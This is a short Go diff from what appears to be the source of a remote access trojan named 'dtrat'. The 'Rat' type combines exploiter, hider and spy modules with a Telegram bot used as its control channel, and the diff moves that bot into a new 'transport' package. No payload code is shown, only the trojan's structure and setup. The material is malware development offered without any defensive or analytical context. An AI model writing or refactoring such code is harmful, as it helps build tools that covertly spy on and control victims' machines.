@@ -1,18 +1,18 @@
 package rat
 
 import (
-	"dtrat/bot"
 	"dtrat/config"
 	"dtrat/engine"
 	"dtrat/exploiter"
 	"dtrat/hider"
 	"dtrat/spy"
+	"dtrat/transport"
 	"fmt"
 	"io"
 )
 
 type Rat struct {
-	Bot       bot.Bot
+	Bot       transport.Transport
 	Engine    *engine.Engine
 	Exploiter *exploiter.Exploiter
 	Hider     *hider.Hider
@@ -28,7 +28,7 @@ func NewRat() (*Rat, error) {
 		return nil, fmt.Errorf("NewConfig: %w", err)
 	}
 
-	bot, err := bot.NewTgBot(cfg)
+	bot, err := transport.NewTgBot(cfg)
 	if err == io.EOF {
 		return nil, fmt.Errorf("Отсутсвует соединение")
 	}
